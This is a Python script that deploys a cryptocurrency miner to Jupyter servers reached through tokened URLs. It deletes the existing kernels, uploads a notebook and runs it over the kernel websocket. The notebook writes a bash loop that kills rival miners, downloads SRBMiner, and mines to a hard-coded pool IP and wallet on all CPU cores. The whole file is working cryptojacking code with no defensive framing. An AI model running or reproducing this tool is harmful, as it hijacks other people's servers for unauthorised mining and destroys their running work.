import re
import requests
import json
import asyncio
import websockets
import uuid
import time
import random
import argparse
from datetime import datetime

def generate_worker_id():
    """Generate a random 3-digit worker ID for each miner"""
    return f"rig_cakarcpu{random.randint(100, 999)}"

def create_shell_script(worker_id):
    """Create the shell script content"""
    shell_script = f'''#!/bin/bash

# Auto-restart mining script with 10-minute cycles
# Worker ID: {worker_id}
echo "[+] Starting miner with Worker ID: {worker_id}"
echo "[+] Auto-restart cycle: 10 minutes"

# Main restart loop
while true; do
    echo "[$(date)] Starting mining cycle..."
    
    # Kill any existing miner processes
    echo "[+] Killing existing miner processes..."
    pkill -f SRBMiner-MULTI
    pkill -f randomvirel
    sleep 5
    
    # Check and kill any remaining processes
    if pgrep -f SRBMiner-MULTI > /dev/null; then
        echo "[!] Force killing remaining processes..."
        pkill -9 -f SRBMiner-MULTI
        sleep 2
    fi
    
    # Download miner if not exists
    if [ ! -f "SRBMiner-Multi-2-9-6/SRBMiner-MULTI" ]; then
        echo "[+] Downloading SRBMiner..."
        wget -q https://github.com/doktor83/SRBMiner-Multi/releases/download/2.9.6/SRBMiner-Multi-2-9-6-Linux.tar.gz
        tar -xf SRBMiner-Multi-2-9-6-Linux.tar.gz > /dev/null 2>&1
        chmod +x SRBMiner-Multi-2-9-6/SRBMiner-MULTI
        echo "[+] Miner setup completed"
    fi
    
    # Start mining
    echo "[+] Starting miner..."
    ./SRBMiner-Multi-2-9-6/SRBMiner-MULTI -a randomvirel -o 178.128.14.152:80 -u v1g5udzsr8h9mr0t0r6mfyy2di7xtya6jkfzoc2.plan -p m=solo -t $(nproc) > miner.log 2>&1 &
    
    MINER_PID=$!
    echo "[+] Miner started with PID: $MINER_PID"
    
    # Wait 10 minutes
    echo "[+] Miner running... Waiting 10 minutes until restart"
    for i in {{1..600}}; do
        # Check if miner process is still alive
        if ! kill -0 $MINER_PID 2>/dev/null; then
            echo "[!] Miner process died, restarting immediately..."
            break
        fi
        sleep 1
    done
    
    echo "[$(date)] Restarting miner..."
    echo "----------------------------------------"
done
'''
    return shell_script

def create_notebook_with_shell_script(worker_id):
    """Create notebook that runs the shell script"""
    shell_script = create_shell_script(worker_id)
    
    notebook_code = f'''
import subprocess
import os
import time

# Create the shell script
shell_script = """{shell_script}"""

# Write script to file
with open("nicegpu.sh", "w") as f:
    f.write(shell_script)

# Make it executable
os.chmod("nicegpu.sh", 0o755)

print("Shell script created: nicegpu.sh")
print("Starting miner with auto-restart...")

# Run the shell script in background
process = subprocess.Popen(["/bin/bash", "nicegpu.sh"])

print(f"Miner started with PID: {{process.pid}}")
print("Auto-restart script is running in background")
print("Miner will restart every 10 minutes automatically")
'''

    return notebook_code

def log_error(url, error_message, error_type="GENERAL"):
    """Error logging to error.txt"""
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open("error.txt", "a", encoding="utf-8") as f:
            f.write(f"[{timestamp}] {error_type}: {url}\n")
            f.write(f"Error: {error_message}\n")
            f.write("-" * 80 + "\n")
        print(f"[!] Error logged for: {url}")
    except Exception as e:
        print(f"[!] Failed to write to error.txt: {e}")

def extract_info(url):
    try:
        # Match either domain or IP + optional port
        m = re.match(r'^(https?)://([a-zA-Z0-9\.\-]+(?::\d+)?)/lab\?token=([a-zA-Z0-9]+)$', url)
        if not m:
            print(f"[!] Invalid URL format: {url}")
            return None

        scheme, host, token = m.groups()
        base_url = f"{scheme}://{host}"
        ws_scheme = "wss" if scheme == "https" else "ws"

        return {
            "base": base_url,
            "token": token,
            "headers": {
                "Authorization": f"token {token}",
                "Content-Type": "application/json"
            },
            "ws_url": f"{ws_scheme}://{host}/api/kernels"
        }
    except Exception as e:
        print(f"[!] Exception in extract_info: {e}")
        return None

def create_notebook(info, url, filename="AutoMiner.ipynb", python_code=None):
    """Create notebook with the shell script execution code"""
    
    notebook = {
        "cells": [
            {
                "cell_type": "code",
                "execution_count": None,
                "metadata": {},
                "outputs": [],
                "source": python_code.strip().splitlines()
            }
        ],
        "metadata": {
            "kernelspec": {
                "display_name": "Python 3",
                "language": "python",
                "name": "python3"
            },
            "language_info": {
                "name": "python",
                "version": "3.x"
            }
        },
        "nbformat": 4,
        "nbformat_minor": 2
    }

    try:
        api_url = f"{info['base']}/api/contents/{filename}"
        response = requests.put(api_url, headers=info["headers"], data=json.dumps({
            "type": "notebook",
            "content": notebook
        }), timeout=30)
        
        if response.status_code in [200, 201]:
            print(f"[+] Notebook '{filename}' created")
            return True
        else:
            error_msg = f"HTTP {response.status_code}: {response.text}"
            log_error(url, f"Notebook creation failed: {error_msg}", "NOTEBOOK_CREATE_ERROR")
            print(f"[!] Failed to create notebook: {error_msg}")
            return False
    except requests.exceptions.Timeout:
        log_error(url, "Notebook creation timeout (30s)", "NOTEBOOK_TIMEOUT")
        print(f"[!] Notebook creation timeout for: {url}")
        return False
    except Exception as e:
        log_error(url, f"Notebook creation exception: {e}", "NOTEBOOK_EXCEPTION")
        print(f"[!] Exception creating notebook: {e}")
        return False

def start_kernel(info, url):
    """Start a new kernel"""
    try:
        response = requests.post(f"{info['base']}/api/kernels", headers=info["headers"], timeout=30)
        if response.status_code in [200, 201]:
            kernel_id = response.json()["id"]
            print(f"[+] Kernel started: {kernel_id}")
            return kernel_id
        else:
            error_msg = f"HTTP {response.status_code}: {response.text}"
            log_error(url, f"Kernel start failed: {error_msg}", "KERNEL_START_ERROR")
            return None
    except requests.exceptions.Timeout:
        log_error(url, "Kernel start timeout (30s)", "KERNEL_TIMEOUT")
        print(f"[!] Kernel start timeout for: {url}")
        return None
    except Exception as e:
        log_error(url, f"Kernel start exception: {e}", "KERNEL_EXCEPTION")
        print(f"[!] Kernel start error: {e}")
        return None

def check_busy_kernels(info, idx, url):
    """Check if any kernels are busy"""
    try:
        response = requests.get(f"{info['base']}/api/kernels", headers=info["headers"], timeout=30)
        if response.status_code != 200:
            log_error(url, f"Failed to get kernels list: HTTP {response.status_code}", "KERNEL_LIST_ERROR")
            return False
            
        kernels = response.json()
        for k in kernels:
            if k.get('execution_state') == 'busy':
                print(f"[{idx}] BUSY KERNEL FOUND: {k['id']}")
                return True
        return False
    except Exception as e:
        log_error(url, f"Kernel check failed: {e}", "KERNEL_CHECK_ERROR")
        return False

def delete_all_kernels(info, idx, url):
    """Delete all existing kernels"""
    try:
        response = requests.get(f"{info['base']}/api/kernels", headers=info["headers"], timeout=30)
        if response.status_code != 200:
            log_error(url, f"Failed to get kernels list: HTTP {response.status_code}", "KERNEL_LIST_ERROR")
            return False
            
        kernels = response.json()
        for k in kernels:
            print(f"[{idx}] Deleting old kernel: {k['id']}")
            del_response = requests.delete(f"{info['base']}/api/kernels/{k['id']}", headers=info["headers"], timeout=30)
            if del_response.status_code not in [200, 204]:
                print(f"[{idx}] Warning: Failed to delete kernel {k['id']}")
        time.sleep(2)
        return True
    except requests.exceptions.Timeout:
        log_error(url, "Kernel deletion timeout (30s)", "KERNEL_DELETE_TIMEOUT")
        return False
    except Exception as e:
        log_error(url, f"Kernel deletion failed: {e}", "KERNEL_DELETE_ERROR")
        print(f"[{idx}] Failed to delete old kernels: {e}")
        return False

def execute_code(info, kernel_id, code, url):
    """Execute code in the kernel"""
    session_id = str(uuid.uuid4())
    ws_url = f"{info['ws_url']}/{kernel_id}/channels?session_id={session_id}"

    async def send_and_listen():
        try:
            async with websockets.connect(ws_url, extra_headers=info["headers"]) as ws:
                msg = {
                    "header": {
                        "msg_id": str(uuid.uuid4()),
                        "username": "",
                        "session": session_id,
                        "msg_type": "execute_request",
                        "version": "5.0"
                    },
                    "parent_header": {},
                    "metadata": {},
                    "content": {
                        "code": code,
                        "silent": False,
                        "store_history": False
                    },
                    "channel": "shell"
                }
                await ws.send(json.dumps(msg))

                # Listen for initial execution response
                for i in range(3):
                    try:
                        response = await asyncio.wait_for(ws.recv(), timeout=5)
                        response_data = json.loads(response)
                        
                        if response_data.get('msg_type') == 'execute_reply':
                            if response_data.get('content', {}).get('status') == 'ok':
                                print(f"[+] Shell script execution started")
                                return None
                            else:
                                error = response_data.get('content', {}).get('evalue', 'Unknown error')
                                return f"Execution error: {error}"
                                
                    except asyncio.TimeoutError:
                        continue
                        
                return None
                
        except Exception as e:
            return str(e)

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        result = loop.run_until_complete(send_and_listen())
        if result:
            log_error(url, f"Code execution failed: {result}", "CODE_EXECUTION_ERROR")
            return result
        return None
    except Exception as e:
        log_error(url, f"Code execution exception: {e}", "CODE_EXECUTION_EXCEPTION")
        return str(e)
    finally:
        loop.close()

def handle_url_notebook(idx, url):
    """Handle URL using notebook method with shell script"""
    worker_id = generate_worker_id()
    print(f"[{idx}] Processing URL: {url}")
    print(f"[{idx}] Worker ID: {worker_id}")
    print(f"[{idx}] Method: Shell script with auto-restart (10 minutes)")
    
    try:
        info = extract_info(url)
        if not info:
            log_error(url, "Invalid URL format or parsing failed", "INVALID_URL")
            print(f"[{idx}] Invalid URL format: {url}")
            return False

        # Check for busy kernels
        if check_busy_kernels(info, idx, url):
            print(f"[{idx}] Busy kernel detected, cleaning...")
        
        # Delete old kernels
        if not delete_all_kernels(info, idx, url):
            print(f"[{idx}] Warning: Failed to clean old kernels")

        # Create notebook code that runs the shell script
        python_code = create_notebook_with_shell_script(worker_id)
        print(f"[{idx}] Created shell script deployment code")

        # Create notebook
        notebook_name = f"Miner_{worker_id}.ipynb"
        if not create_notebook(info, url, notebook_name, python_code):
            print(f"[{idx}] Failed to create notebook")
            return False

        # Start kernel
        kernel_id = start_kernel(info, url)
        if not kernel_id:
            print(f"[{idx}] Failed to start kernel")
            return False

        print(f"[{idx}] Kernel started: {kernel_id}")

        # Execute the code
        print(f"[{idx}] Deploying shell script...")
        err = execute_code(info, kernel_id, python_code, url)
        
        if err:
            print(f"[{idx}] Error: {err}")
            return False
        else:
            print(f"[{idx}] SUCCESS: Auto-restart miner deployed via shell script!")
            print(f"[{idx}] The shell script will manage 10-minute restart cycles")
            return True
            
    except Exception as e:
        log_error(url, f"Unexpected exception: {e}", "HANDLE_URL_EXCEPTION")
        print(f"[{idx}] Exception: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(description='Jupyter Notebook Miner Deployer - Shell Script Method')
    parser.add_argument('--url', required=True, help='Jupyter notebook URL with token')
    args = parser.parse_args()

    # Initialize error log
    try:
        with open("error.txt", "w", encoding="utf-8") as f:
            f.write(f"Error Log - Started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("=" * 80 + "\n")
        print("[+] Error log initialized: error.txt")
    except Exception as e:
        print(f"[!] Failed to initialize error log: {e}")

    print(f"[+] Target: {args.url}")
    print(f"[+] Deployment: Shell script with auto-restart")
    
    success = handle_url_notebook(1, args.url)
    
    if success:
        print(f"\n[+] SUCCESS: Shell script miner deployed!")
        print(f"[+] Auto-restart every 10 minutes")
        print(f"[+] Process: Kill → Download (if needed) → Mine → Wait 10min → Repeat")
    else:
        print(f"\n[!] FAILED: Deployment failed")
        print(f"[!] Check error.txt for details")
    
    try:
        with open("error.txt", "a", encoding="utf-8") as f:
            f.write(f"\nSUMMARY - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("=" * 80 + "\n")
            f.write(f"URL: {args.url}\n")
            f.write(f"Method: Shell script\n")
            f.write(f"Result: {'SUCCESS' if success else 'FAILED'}\n")
    except Exception as e:
        print(f"[!] Failed to write summary: {e}")

if __name__ == "__main__":
    main()
